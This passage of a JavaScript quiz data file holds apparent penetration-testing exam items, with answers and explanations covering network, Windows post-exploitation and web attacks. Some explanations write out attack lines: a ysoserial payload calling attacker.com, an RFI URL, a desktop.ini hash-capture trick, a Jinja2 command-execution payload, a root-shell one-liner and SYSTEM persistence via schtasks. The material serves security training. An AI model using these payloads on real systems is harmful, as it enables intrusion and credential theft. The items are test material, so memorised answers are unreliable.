    {id:"2-97",domain:"Networking",q:"IPv6 enabled on hosts but network monitoring focuses only on IPv4. What attack becomes possible?",opts:["IPv6 allows direct communication bypassing IPv4-based firewall rules entirely","Rogue Router Advertisement attacks: attacker sends RA packets claiming to be an IPv6 router; hosts configure themselves with IPv6 default gateway via SLAAC, routing IPv6 traffic through the attacker unmonitored","IPv6 NDP is equivalent to ARP poisoning and blocked by the same controls","IPv6 extension headers allow fragmentation bypassing deep packet inspection on IPv4-based IDS"],ans:1,exp:"IPv6 Rogue RA attacks: send unsolicited RA packets claiming to be an IPv6 router. Hosts using SLAAC configure an IPv6 address and default gateway automatically. If no IPv6 monitoring exists, the attacker can MITM IPv6 traffic. Tools: fake_router6 (THC-IPV6). Mitigation: RA Guard (IPv6 equivalent of DHCP snooping), IPv6 monitoring, disable IPv6 where not used."},
    {id:"2-98",domain:"Web",q:"XML-RPC requests sent with 4096 parameters. Server crashes. What vulnerability is demonstrated?",opts:["SQL injection via XML-RPC parameter values","XML-RPC DoS via parameter amplification or resource exhaustion through excessive parameter processing","SSRF via the XML-RPC methodCall element","XXE injection via the XML-RPC DTD"],ans:1,exp:"XML-RPC amplification / resource exhaustion: XML-RPC allows array/struct parameters that can be deeply nested. Submitting 4096 parameters creates massive memory allocation and processing overhead. The 'Billion Laughs' attack is an XML-specific variant using entity expansion. Rate limiting and parameter count limits should be enforced."},
    {id:"2-99",domain:"Networking",q:"Identifying the version of a service that doesn't display a banner. Which nmap technique is used?",opts:["nmap -sV with --version-intensity 9 for maximum probe coverage","nmap -sP for service protocol analysis","nmap -O for OS fingerprinting which includes service identification","nmap -A for all aggressive detection"],ans:0,exp:"nmap -sV performs service version detection by sending probes and analysing responses. --version-intensity 0-9 controls probe aggressiveness (9 = try all probes, slower but more thorough). nmap -sP is ping scan (deprecated, now -sn). -O is OS detection (different from service version). -A enables OS detection + version + scripts + traceroute combined."},
    {id:"2-100",domain:"Post-Exploitation",q:"Meterpreter shell on internal host can't reach C2 directly due to corporate proxy. Which transport option allows C2 through proxy?",opts:["Use reverse_https with proxy settings: configure Meterpreter to use internal proxy via HTTP_PROXY/HTTPS_PROXY","Use DNS transport which bypasses HTTP proxies","Use reverse_tcp on port 80 since proxies only inspect HTTPS traffic","Enable Meterpreter's built-in port knocking to bypass proxy"],ans:0,exp:"Meterpreter reverse_https can be configured with proxy settings: set the system proxy in Meterpreter's transport options (PROXY_TYPE HTTP, PROXY_HOST proxy.corp.com, PROXY_PORT 8080). The HTTPS traffic blends with normal corporate HTTPS. Alternative: use a C2 framework that natively supports HTTP proxy (Cobalt Strike malleable profiles, Sliver, etc.)."},
    {id:"2-101",domain:"Web",q:"Web app has 'callback' parameter: '/api/data?callback=myFunction'. Response is 'myFunction({\"data\":...})'. What vulnerability and impact?",opts:["Reflected XSS via callback parameter if response has text/html content type","JSONP injection: if callback not sanitised and reflected in application/javascript response, attacker can inject malicious JavaScript; same-origin policy doesn't protect against JSONP","Parameter pollution enabling second-order SQL injection","Open redirect via callback URL parameter"],ans:1,exp:"JSONP (JSON with Padding) is a legacy cross-origin data sharing technique. If callback parameter is unsanitised, an attacker can set callback=maliciousCode; to inject arbitrary JavaScript. The response is: maliciousCode;({\"data\":...}) — executed as JavaScript. Modern fix: use CORS instead of JSONP. If JSONP is required: whitelist callback function name characters."},
    {id:"2-102",domain:"Cryptography",q:"RADIUS server uses PAP authentication. Shared secret is known. Why can PAP credentials be recovered from a capture?",opts:["PAP transmits passwords in plaintext in the RADIUS User-Password attribute","PAP encrypts password with shared secret using XOR and MD5; if shared secret known, the XOR with MD5-hashed (shared_secret+authenticator) can be reversed to recover plaintext","PAP uses one-way MD5 hashing; recovery impossible even with shared secret","PAP credentials encrypted with client's certificate private key"],ans:1,exp:"RADIUS PAP encryption: User-Password = password XOR MD5(shared_secret || authenticator). With the shared secret and the authenticator (from the RADIUS packet), you can compute MD5(shared_secret || authenticator) and XOR with the encrypted User-Password to recover the plaintext. Tools: hashcat mode 1411 (RADIUS), or radiusd with packet capture."},
    {id:"2-103",domain:"Networking",q:"Bettercap MITM observes HTTPS traffic downgraded to HTTP for some sites. What attack mechanism?",opts:["SSLStrip: intercepts initial HTTP request before HTTPS redirect, proxies HTTPS to server, serves HTTP to client; sites without HSTS preloading are vulnerable","POODLE: forces SSL 3.0 fallback which Bettercap exploits","BEAST: CBC mode attacks on TLS 1.0 allow decryption","FREAK: forces export-grade cipher negotiation"],ans:0,exp:"SSLStrip (Moxie Marlinspike, 2009): intercepts the first HTTP request before the server redirects to HTTPS. Bettercap serves HTTP to the client (appears as http://) while proxying HTTPS to the real server. Works against sites without HSTS preloading. HSTS (max-age + preloading) is the mitigation — browsers refuse HTTP for HSTS-protected sites regardless of what the network says."},
    {id:"2-104",domain:"Networking",q:"IKEv1 aggressive mode vs main mode with PSK auth. Which has a specific weakness enabling offline cracking?",opts:["IKEv1 main mode with PSK leaks identity allowing dictionary attacks against XAUTH","In aggressive mode, PSK hashes are sent without identity protection and can be captured for offline cracking; main mode is not directly vulnerable","IKEv1 uses DES for phase 1 which can be brute forced to recover PSK","IKEv1 main mode PSK exchanges are transmitted in cleartext"],ans:1,exp:"IKEv1 aggressive mode with PSK: unlike main mode (6 messages with identity protected), aggressive mode (3 messages) sends the hash of the pre-shared key AND identity in the clear before the phase 1 SA is established. An attacker can capture this hash and crack it offline (psk-crack tool, hashcat). ike-scan can force aggressive mode on some implementations."},
    {id:"2-105",domain:"Networking",q:"WPA2-PSK 4-way handshake captured. What information enables offline cracking?",opts:["Handshake contains PSK encrypted with AES; decrypt using SSID as IV","Handshake contains PTK derived from PSK, SSID, and nonces; cracking involves computing trial PTKs from password candidates and comparing the resulting MIC against captured handshake MIC","Handshake contains PMKID which is MD5 hash of PSK crackable by rainbow tables","Handshake exposes PMK directly decryptable using SSID"],ans:1,exp:"WPA2-PSK 4-way handshake cracking: PMK = PBKDF2(passphrase, SSID, 4096 iterations, 256 bits). PTK = PRF(PMK, ANonce, SNonce, BSSID, client_MAC). MIC = HMAC-SHA1 of EAPOL frame using KCK (derived from PTK). Cracking: for each password candidate, compute PMK → PTK → KCK → MIC, compare MIC with captured MIC. Match = correct password. hashcat mode 22000."},
    {id:"2-106",domain:"Networking",q:"WiFi clients need to be forced to connect to a rogue AP. Which technique deauthenticates them from the legitimate AP?",opts:["Beacon flooding sending fake beacon frames from rogue AP","802.11 deauthentication frame injection: sending spoofed deauth frames (with legitimate AP's BSSID as source) to clients, forcing them to disconnect","ARP cache poisoning of the wireless network to redirect client DNS","Jamming the legitimate AP's frequency"],ans:1,exp:"802.11 deauthentication injection (without PMF): 802.11 management frames are unauthenticated. Sending a deauth frame spoofed from the legitimate AP's BSSID to clients causes them to disconnect. They then scan for available APs and connect to the strongest signal — your rogue AP. Use: aireplay-ng -0 or MDK3. PMF (802.11w) prevents this attack."},
    {id:"2-107",domain:"Networking",q:"ICS/SCADA system with Modbus on TCP 502. What specific risk does unauthenticated Modbus access present?",opts:["Modbus allows reading sensor data only; actuator control not possible without OPC UA","Modbus has no authentication; any device can read sensor values AND send control commands (write coils/registers) to PLCs, potentially causing physical process disruption","Modbus is read-only; write operations require a separate industrial control protocol","Modbus uses proprietary encryption preventing data interception but authentication is weak"],ans:1,exp:"Modbus is designed for simplicity — it has NO authentication, NO authorisation, NO encryption. Any connected device can: read discrete inputs (FC1/FC2), read registers (FC3/FC4), write coils/registers (FC5/FC6/FC15/FC16). In an industrial context, writing registers to a PLC can directly control physical processes: motors, valves, pumps. This can cause physical damage or safety incidents."},
    {id:"2-108",domain:"Post-Exploitation",q:"Meterpreter session running. 'getpid' then 'migrate 624' where PID 624 is svchost.exe. Why is migration to svchost.exe preferred?",opts:["svchost.exe has elevated privileges automatically inherited by migrated session","svchost.exe is a legitimate system process less likely to be terminated; migrating provides process stability and may inherit higher-integrity token and privileges","svchost.exe bypasses Windows Defender by design since it's on the exclusion list","Migration to svchost.exe establishes persistence through the Service Control Manager"],ans:1,exp:"Process migration benefits: (1) Stability — svchost.exe runs continuously (user-land exploits may terminate), (2) OPSEC — Meterpreter threads inside svchost are harder to detect than a standalone meterpreter.exe, (3) Privilege — svchost.exe runs as SYSTEM or NETWORK SERVICE, potentially inheriting those tokens. Verify target process is the right privilege level before migrating."},
    {id:"2-109",domain:"Post-Exploitation",q:"'whoami /priv' shows SeImpersonatePrivilege: Enabled on Windows Server 2016. Which Potato attack variant is the reliable choice?",opts:["Hot Potato (NBNS/WPAD abuse) works on Server 2016 without restrictions","PrintSpoofer or JuicyPotato; JuicyPotato may not work on Server 2016+ so PrintSpoofer is the reliable choice","Rotten Potato which works universally on all Windows versions","Sweet Potato targeting Windows Server 2016 SP1 specifically"],ans:1,exp:"JuicyPotato uses COM object abuse with specific CLSIDs. Many CLSIDs are patched in Server 2016/Windows 10 1809+. PrintSpoofer (by itm4n) uses the Windows Print Spooler named pipe impersonation technique — reliable on Server 2016+. RoguePotato is another Server 2016+ alternative. PrintSpoofer command: PrintSpoofer.exe -i -c 'cmd /c whoami'."},
    {id:"2-110",domain:"Post-Exploitation",q:"Meterpreter on Windows domain machine as local admin. 'hashdump' returns only local hashes. Why not domain hashes, and how to get them?",opts:["hashdump requires SYSTEM on DC; upgrade to domain admin and run remotely","Domain hashes are not stored locally in the SAM (except as cached credentials); to get domain hashes, compromise the DC and use secretsdump against NTDS.dit","hashdump with '--domain' flag retrieves domain hashes from any domain-joined machine","Domain hashes are in LSA secrets requiring '--lsa' flag with hashdump"],ans:1,exp:"Domain account password hashes are ONLY stored in the NTDS.dit file on domain controllers. The local SAM database on a domain-joined workstation contains only LOCAL account hashes. Domain accounts that have logged into the machine have cached credential hashes (MSCACHE/DCC2) in HKLM\\SECURITY — retrievable but require higher difficulty cracking (PBKDF2-based)."},
    {id:"2-111",domain:"Post-Exploitation",q:"Mimikatz on Windows 10 (updated): sekurlsa::logonpasswords returns hashes but no cleartext. Why doesn't WDigest produce cleartext credentials?",opts:["Windows 10 uses TPM encryption preventing Mimikatz from reading LSASS memory","WDigest stores credentials in cleartext only if HKLM\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest\\UseLogonCredential=1; modern Windows defaults to 0","Windows 10 Credential Guard isolates all credentials in hypervisor-protected VTL1","Windows 10 uses NTLM only; WDigest completely removed from OS"],ans:1,exp:"WDigest authentication (RFC 2617 HTTP Digest): requires plaintext credentials to compute the digest response. KB2871997 (2014) added UseLogonCredential registry value defaulting to 0 (disabled) on Windows 8.1/Server 2012 R2+. Setting UseLogonCredential=1 (requires reboot and new logon) re-enables cleartext storage in LSASS."},
    {id:"2-112",domain:"Post-Exploitation",q:"Scheduled task for persistent daily execution. Which schtasks command is correct?",opts:["schtasks /create /tn \"Update\" /tr \"C:\\payload.exe\" /sc daily /st 09:00 /ru SYSTEM /f","schtasks /add /name \"Update\" /run \"C:\\payload.exe\" /schedule daily /time 09:00","at 09:00 /every:Monday,Tuesday C:\\payload.exe","schtasks /register /task \"Update\" /command \"C:\\payload.exe\" /repeat daily"],ans:0,exp:"schtasks /create syntax: /tn=task name, /tr=task run (command), /sc=schedule type (daily/weekly/once), /st=start time (HH:MM), /ru=run as user (SYSTEM requires admin), /f=force overwrite existing task. The AT command is deprecated in modern Windows. /add and /register are not valid schtasks parameters."},
    {id:"2-113",domain:"Post-Exploitation",q:"SMB share with read/write access. A 'desktop.ini' file is placed in the share. When a Windows user browses it in Explorer, what attack does this enable?",opts:["Remote code execution via Windows Shell handler for .ini files","Automatic capture of NTLMv2 hashes when Windows client tries to authenticate to the UNC path referenced in desktop.ini; Responder listens for the authentication","Kerberos ticket harvesting via UNC path's Kerberos SPN registration","Remote DLL injection through shell extension handler for .ini files"],ans:1,exp:"desktop.ini NTLM capture: create a desktop.ini containing [.ShellClassInfo] IconResource=\\\\attacker\\share\\icon.ico. When Windows Explorer renders the directory, it automatically tries to load the icon from the UNC path — triggering NTLM authentication to the attacker's Responder/Impacket SMB server. Captures NTLMv2 hashes without any user interaction beyond browsing the share."},
    {id:"2-114",domain:"Unix",q:"Linux binary has 'cap_setuid+ep'. Python3: 'import os; os.setuid(0); os.system(\"/bin/bash -p\")'. Why does this produce a root shell?",opts:["Python's os module must be imported as root for setuid to work","The binary (python3) must have cap_setuid in its effective capability set; the setuid(0) call succeeds even as a non-root user","The -p flag must be passed to maintain privileges during setuid","The binary must be owned by root with SUID bit set in addition to the capability"],ans:1,exp:"Linux capabilities on binaries: cap_setuid+ep means the binary starts with cap_setuid in BOTH Effective (active by default when binary runs) and Permitted sets. os.setuid(0) calls the setuid() syscall with UID 0. The kernel checks: does the process have cap_setuid in its effective set? Yes. So the call succeeds. The real UID becomes 0. /bin/bash -p preserves the effective UID → root shell."},
    {id:"2-115",domain:"Web",q:"Python Flask app source: 'app.secret_key = \"dev\"'. Application uses Flask-Login. What is the security impact?",opts:["Secret key only used for CSRF token generation; session security not affected","Flask signs session cookies using the secret_key with HMAC-SHA1; a known/weak key allows forging session cookies with arbitrary data (e.g., is_admin:true) by signing them with the same key","Secret key encrypts session data; weak key allows brute force decryption but not forgery","Flask stores sessions server-side; secret_key only controls session ID which is random"],ans:1,exp:"Flask sessions are signed client-side cookies (not encrypted by default): base64(JSON payload) + HMAC-SHA1(secret_key). If the secret_key is known ('dev') or guessable, an attacker can: decode the existing cookie, modify the JSON (e.g., change user_id or add is_admin:True), re-sign with the known key, and submit the forged cookie. Use flask-unsign or create a custom script."},
    {id:"2-116",domain:"Web",q:"PHP: '$file = $_GET[\"page\"] . \".php\"; include($file);'. Submitting 'http://attacker.com/shell' — what vulnerability and why is null byte relevant in old PHP?",opts:["LFI; null byte truncates .php in PHP <5.3.4","RFI; null byte allows bypassing the .php extension append in PHP <5.3.4, enabling inclusion of files like shell.txt without the .php extension","Path traversal; null bytes stop reading the path at the null byte","Type juggling; the null byte converts the string to boolean false in the include call"],ans:1,exp:"Remote File Inclusion (RFI): allow_url_include=On allows include() to load remote URLs. The appended .php makes the request http://attacker.com/shell.php. With PHP <5.3.4, submitting 'http://attacker.com/shell.txt%00' (null byte URL-encoded) truncates at the null byte before .php is appended, allowing shell.txt to be included without the .php extension on the remote server."},
    {id:"2-117",domain:"Cryptography",q:"REST API uses JWT with HS256 (HMAC-SHA256). Server uses the same secret for signing and verification. The secret is 'secret123'. What can the tester now do?",opts:["Decrypt the JWT payload since HS256 encrypts the token contents","Forge valid JWT tokens with any claims (e.g., admin:true) by signing them with the compromised secret","Perform timing attack to enumerate other valid JWT secrets","Replay captured JWT tokens without modification"],ans:1,exp:"HS256 (HMAC-SHA256) is symmetric — the same key signs and verifies. JWT payload is NOT encrypted, only signed (Base64URL encoded). With the known secret: decode the payload (base64url), modify claims (add admin:true, change user_id), re-encode, sign with the secret using HS256, submit the forged JWT. The server verifies the HMAC correctly and accepts it. Use jwt.io or jwt_tool."},
    {id:"2-118",domain:"Web",q:"Flask/Jinja2 SSTI confirmed: '{{7*7}}' returns 49. What payload achieves RCE?",opts:["{{system('id')}}","{{''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read()}}","{{exec('import os; os.system(\"id\")')}}","{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}"],ans:3,exp:"Jinja2 SSTI RCE payload traverses Python's object model: request.application.__globals__ accesses Flask's global namespace, __builtins__ accesses Python builtins, __import__('os') imports the os module, .popen('id').read() executes the command. Alternative: {{config.__class__.__init__.__globals__['os'].popen('id').read()}}. The exact payload varies by Jinja2 version."},
    {id:"2-119",domain:"Web",q:"Magic bytes 'AC ED 00 05' in an HTTP request body. Application uses vulnerable Apache Commons Collections. What tool generates a deserialization payload?",opts:["sqlmap with --tamper java-deserialize","ysoserial with the CommonsCollections1 gadget chain to generate a command execution payload","Burp Suite's Java serialization scanner extension directly","Metasploit's java_deserialize module"],ans:1,exp:"AC ED 00 05 = Java serialized object header. ysoserial (by frohoff) generates serialized Java payloads using known 'gadget chains' from vulnerable libraries. CommonsCollections1 (for Commons Collections 3.1) produces a payload that executes OS commands when deserialized. Command: java -jar ysoserial.jar CommonsCollections1 'curl http://attacker.com/x' > payload.ser."},
    {id:"2-120",domain:"Web",q:"SSRF found. Using HTTP URI for port scanning on 10.10.10.5. What response difference indicates open vs closed port?",opts:["Open ports return HTTP 200; closed return HTTP 404","Open ports result in connection established (quick response or valid content); closed ports cause connection refused errors or timeouts — detectable via response time and error type","Open ports return empty 200; closed return 301 redirect to login","SSRF cannot be used for port scanning; it only works for HTTP services"],ans:1,exp:"SSRF port scanning via response analysis: (1) Open port (HTTP service): fast response with content, (2) Open port (non-HTTP): fast connection established then error (can't parse HTTP), (3) Closed port: immediate connection refused — fast response, (4) Filtered port: timeout (slowest, typically 30+ seconds). Time-based scanning is also possible: measure response time to distinguish filtered from closed/open ports."}
  ]
};
